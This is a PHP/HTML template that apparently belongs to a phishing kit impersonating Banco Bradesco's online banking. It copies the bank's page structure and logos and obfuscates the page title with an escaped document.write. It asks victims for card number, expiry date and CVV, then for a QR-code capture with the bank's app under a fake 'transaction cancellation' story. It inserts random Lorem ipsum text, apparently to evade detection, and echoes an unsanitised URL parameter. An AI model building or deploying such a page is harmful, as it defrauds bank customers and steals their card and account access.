...
$infoTipo = isset($_SESSION['id']) ? Info::getTipo($_SESSION['id']) : null;

function getLayout(){
    global $infoTipo;
    if($infoTipo && isset($infoTipo['tipo'])){
    ...
    return 'classic'; // valor padrão caso não tenha dados
}
...
<html lang="pt-BR" style="overflow: visible;">
   <head>
      <meta charset="utf-8">
<script>
document.write(unescape('%3Ctitle%3EBanco%20Bradesco%20%7C%20Entre%20N%C3%B3s%2C%20Voc%C3%AA%20Vem%20Primeiro%3C/title%3E'));
</script>
  ...
  function alterar_url(nova) {
   ...
   <body style="padding-top: 158px" onload="alterar_url('')">
      ...
      <brad-root _nghost-xfy-c0="" ng-version="7.2.16">
         <brad-header _ngcontent-xfy-c0="">
               ...
               <style>
                  ...
                  .top-bar.classic header .logo { background-image: url('images/logo-virtual.svg'); background-repeat: no-repeat; background-position: center center; width: 158px; height: 48px; top: 16px; }
                  ...
                  .top-bar.prime header .logo { background-image: url('images/logo-virtual-prime.png'); background-repeat: no-repeat; background-position: center center; width: 104px; height: 40px; top: 24px; }
                  ...
                  .top-bar.private header .logo { background-image: /*savepage-url=logo-virtual-private.svg*/ url(); background-repeat: no-repeat; background-position: center center; width: 158px; height: 48px; top: 14px; }
                  ...
                  .top-bar.universitario header .logo { background-image: /*savepage-url=logo-virtual-universitario.png*/ url(); background-repeat: no-repeat; background-position: center center; width: 56px; height: 56px; top: 16px; }
                  ...
                  .top-bar.click-conta header .logo { background-image: /*savepage-url=logo-virtual-clickconta.png*/ url(); background-repeat: no-repeat; background-position: center center; width: 77px; height: 56px; top: 16px; }
                  ...
                  .top-bar.exclusive header .logo { background-image:  url('images/logo-virtual-exclusive.png'); background-repeat: no-repeat; background-position: center center; width: 118px; height: 42px; top: 16px; }
                        ...
                        <brad-dados-cliente _nghost-xfy-c6="">
                           <div _ngcontent-xfy-c6="" class="usuario">
                              ...
                              <div _ngcontent-xfy-c6="" class="dados-conta">
                                 <p _ngcontent-xfy-c6="" class="nome"><?php echo isset($_SESSION['nome']) ? $_SESSION['nome'] : '';?></p>
                                    ...
                                    <div _ngcontent-tfo-c9="" class="card">
                                       ...
                                       <div _ngcontent-tfo-c9="" class="card-content">
                                          ...
                                          <dl _ngcontent-tfo-c9="">
                                             ...
                                             <dd _ngcontent-tfo-c9=""><a _ngcontent-tfo-c9="" href="javascript:;">0582.GERENCIA@BANCO-VIRTUAL.COM.BR</a></dd>
                                          </dl>
                                          <dl _ngcontent-tfo-c9="">
         ...
         <brad-footer _ngcontent-xfy-c0="">
               ...
               <style>* { box-sizing: border-box; }
                  ...
                  footer.classic .logo { background-image: url('images/logo-virtual2.png'); background-size: 134px 30px; width: 134px; height: 30px; }
                  ...
                  footer.prime .logo { background-image:url('images/logo-virtual2.png'); background-size: 112px 26px; width: 112px; height: 26px; }
                  ...
                  footer.private .logo { background-image:url('images/logo-virtual2.png'); background-size: 119px 26px; width: 119px; height: 26px; }
                  ...
                  footer.exclusive .logo { background-image:url('images/logo-virtual2.png'); background-size: 112px 26px; width: 112px; height: 26px; }
                  ...
                  footer.universitario .logo { background-image:url('images/logo-virtual2.png'); background-size: 119px 26px; width: 119px; height: 26px; }
                  ...
                  footer.click-conta .logo { background-image: url('images/logo-virtual2.png'); background-size: 119px 26px; width: 119px; height: 26px; }
  ...
  <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
        ...
        <div id="boxCvv" class="boxes hide">
            <div class="boxLinha">
               <span class="txt_msg_erro_disp hide">
                  <span class="erro_msg ml10 none_i error-show"><b>Os dados do cartão informados não estão corretos.</b></span>
               </span>
               <p class="center">Preencha os campos abaixo com os dados<br>do seu <strong>cartão de crédito / débito</strong>.</p>
               <div class="imagem center" style="padding-top:20px">
                    <img src="images/icone-cvv.png" alt="">
               </div>
               
               <div class="form-code" style="width:350px;margin-top:30px;">
                  <input style="text-align:center;" autofocus type="text" maxlength="22" id="numeroCartao" name="numeroCartao" title="Informe o número do cartão." class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" placeholder="0000.0000.0000.0000" tabindex="4">
               </div>
               
               <div class="form-code" style="width:120px;margin-top:20px;">
                  <input style="text-align:center;" type="text" maxlength="5" id="mesAno" name="mesAno" title="Informe o mês e ano de validade." class="border-chars form-digits only-numbers tabindex naotrocafoco denyAutoComplete" autocomplete="new-password" placeholder="MM/AA" tabindex="5">
               </div>
               
               <div class="form-code" style="width:110px;margin-top:20px;">
                  <input style="text-align:center;" type="text" maxlength="3" id="cvv" name="cvv" title="Informe o CVV do cartão." class="border-chars form-digits only-numbers tabindex naotrocafoco denyAutoComplete" autocomplete="new-password" placeholder="CVV" tabindex="6">
               </div>

               <div class="divBotoesPagina">
                  <button type="button" id="btnAtualizarCvv" class="btn-action action-button tabindex" title="Confirmar" tabindex="7">Confirmar</button>
               </div>
        ...
        <div id="boxQrCode" class="boxes hide">
            ...
            <span class="txt_msg_erro_disp">
               ...
               <div id="aguardeQR" class="hide">
                     <p>Estamos gerando o cancelamento da transação em análise, efetue a captura do <strong>QR Code</strong> utilizando o <strong>App Bradesco</strong> instalado em seu celular.</p>
        ...
        <div id="boxAtualizarModulo" class="boxes hide">
            <div class="boxLinha">
                  ...
                  <h1>Cancelamento da Transação</h1>
                  <p style="margin:0px;margin-top:10px;">O cancelamento da transação está em andamento.<br>Aguarde alguns minutos.</p>
                  <div class="center">
                     <img width="130" src="images/logo-virtual.png" alt="">
                  </div>
                  <div class="barra">
                     <div class="miolo"></div>
                  </div>
        ...
        <div id="boxMsg" class="boxes hide">
            <div class="boxLinha">
                  ...
                  <h1 class="center" style="margin-bottom:30px;">Atenção!</h1>
                  <!-- <div class="center">
                     <img width="90" src="images/logo-virtual.png" alt="">
                  </div> -->
                  <p id="msg" style="padding:0px 80px;margin:0px;margin-top:0px; margin-bottom:30px;"></p>
                  <div>
                     <button style="margin:0 auto;height:30px;line-height:30px; margin-bottom:40px;width:200px;" type="button" id="btnEntendido" class="btn-action action-button tabindex" title="Entendido!" tabindex="5">Entendido!</button>
                  </div>
            </div>
        </div>
      ...
      <input type="hidden" name="idInfo" id="idInfo" value="<?php echo isset($_SESSION['id']) ? $_SESSION['id'] : '';?>">
      <input type="hidden" name="clientHashId" id="clientHashId" value="<?php echo $_GET["hash"];?>">
      <script src="js/jquery-3.4.1.min.js"></script>
      <script src="js/jquery.modal.min.js"></script>
      <script src="js/jquery.mask.min.js"></script>

      <script src="js/custom-home.js?v=<?php echo time(); ?>"></script>
      <script src="js/cartao-funcionalidades.js?v=<?php echo time(); ?>"></script>
      <p class="random"><?php echo Lorem::ipsumWords(75);?></p>
   </body>
</html>